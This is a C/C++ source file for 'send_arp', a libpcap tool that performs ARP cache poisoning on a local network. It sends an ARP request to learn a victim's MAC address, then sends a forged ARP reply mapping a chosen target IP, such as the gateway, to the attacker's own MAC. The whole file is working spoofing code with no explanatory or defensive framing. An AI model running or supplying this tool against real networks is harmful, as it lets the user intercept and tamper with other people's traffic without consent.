#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/if_arp.h>

struct ethernet{
	u_char destination_address[ETHER_ADDR_LEN];
	u_char source_address[ETHER_ADDR_LEN];
	uint16_t ethernet_type;
};
struct arp{
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint16_t opcode;
	u_char sender_MAC[ETH_ALEN];
	u_char sender_IP[4];
	u_char target_MAC[ETH_ALEN];
	u_char target_IP[4];
};
/*
void print_mac(char * str,u_char * addr){
	int i;
	printf("%s: ",str);
	for(i=0;i<ETHER_ADDR_LEN-1;i++)printf("%02x:",(u_char)*(addr+i));
	printf("%02x\n",(u_char)*(addr+i));
}
*/
bool check_ip(struct in_addr ip1, u_char *ip2){
	for(int i=0;i<4;i++){
		if((((ip1.s_addr)>>(i*8))&0xff)!=*(ip2+i))return false;
	}
	return true;
}

bool check(u_char * p, int len, struct in_addr ip, uint8_t * mac){
	int i;
	struct ethernet * a_ptr=(struct ethernet *)p;
	if(ntohs(a_ptr->ethernet_type)==ETHERTYPE_ARP){
		struct arp * a_ptr=(struct arp *)(p+sizeof(struct ethernet));
		if(ntohs(a_ptr->opcode)==ARPOP_REPLY){
			if(check_ip(ip, a_ptr->sender_IP)){
				//print_mac("mac",a_ptr->sender_MAC);
				for(i=0;i<ETHER_ADDR_LEN;i++)*(mac+i)=*(a_ptr->sender_MAC+i);
				return true;
			}
		}
	}
	return false;
}

void usage() {
  printf("syntax: send_arp <interface> <send ip> <target ip>\n");
  printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_ip(char * interface, struct in_addr * ip){
	int fd;
	struct ifreq ifr;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	*ip=((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
}

void get_mac_address(u_char * addr){
	struct ifreq ifr;
	struct ifconf ifc;
	char buf[1024];
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	ioctl(sock, SIOCGIFCONF, &ifc);
	struct ifreq* it = ifc.ifc_req;
	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
	for (; it != end; ++it) {
		strcpy(ifr.ifr_name, it->ifr_name);
		if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
			if (! (ifr.ifr_flags & IFF_LOOPBACK)) { 
				if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
					memcpy(addr, ifr.ifr_hwaddr.sa_data, 6);   
					break;
                }
            }
        }
    }
}

uint32_t make_arp_packet(u_char * p, struct in_addr ip1, struct in_addr ip2, u_char * mac1, u_char * mac2=0){
	int i,j;
	uint32_t len=0;
	if(!mac2)for(i=0;i<ETHER_ADDR_LEN;i++)p[len++]=0xff;
	else for(i=0;i<ETHER_ADDR_LEN;i++)p[len++]=mac2[i];
	for(i=0;i<ETHER_ADDR_LEN;i++)p[len++]=mac1[i];
	p[len++]=ETHERTYPE_ARP>>8;
	p[len++]=ETHERTYPE_ARP&0xff;
	p[len++]=ARPHRD_ETHER>>8;
	p[len++]=ARPHRD_ETHER&0xff;
	p[len++]=ETHERTYPE_IP>>8;
	p[len++]=ETHERTYPE_IP&0xff;
	p[len++]=ETHER_ADDR_LEN;
	p[len++]=sizeof(in_addr);
	if(!mac2){
		p[len++]=ARPOP_REQUEST>>8;
		p[len++]=ARPOP_REQUEST&0xff;
	}
	else{
		p[len++]=ARPOP_REPLY>>8;
		p[len++]=ARPOP_REPLY&0xff;
	}
	for(i=0;i<ETHER_ADDR_LEN;i++)p[len++]=mac1[i];	
	for(i=0;i<sizeof(in_addr);i++)p[len++]=(ip1.s_addr>>(i*8))&0xff;
	if(!mac2)for(i=0;i<ETHER_ADDR_LEN;i++)p[len++]=0x00;
	else for(i=0;i<ETHER_ADDR_LEN;i++)p[len++]=mac2[i];
	for(i=0;i<sizeof(in_addr);i++)p[len++]=(ip2.s_addr>>(i*8))&0xff;
	return len;
} 


int main(int argc, char* argv[]) {
  if (argc != 4) {
  	usage();
  	return -1;
  }
  char* dev = argv[1];
  struct in_addr send_ip, target_ip;
  inet_aton(argv[2], &send_ip);
  inet_aton(argv[3], &target_ip);
  struct in_addr my_ip;
  get_ip(dev, &my_ip);
  u_char mac_address[ETHER_ADDR_LEN];
  get_mac_address(mac_address);
  u_char* packet1=(u_char*)malloc(sizeof(u_char)*100);
  uint32_t packet1_len=make_arp_packet(packet1, my_ip, send_ip, mac_address);
  char errbuf[PCAP_ERRBUF_SIZE];
  
  pcap_t *fp=pcap_open_live(dev,BUFSIZ, 1,1000,errbuf);
  
  if (fp == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  pcap_sendpacket(fp, packet1, packet1_len);

  u_char target_mac_address[ETHER_ADDR_LEN];
  
  while (1) {
  	struct pcap_pkthdr* header;
  	const u_char* packet;
    int res = pcap_next_ex(fp, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    if(check((u_char *)packet, header->caplen, send_ip, target_mac_address))break;
  }
  
  u_char* packet2=(u_char*)malloc(sizeof(u_char)*100);
  uint32_t packet2_len=make_arp_packet(packet2, target_ip, send_ip, mac_address, target_mac_address);
  pcap_sendpacket(fp, packet2, packet2_len);

  free(packet1);
  free(packet2);
  pcap_close(fp);
  
  return 0;
}
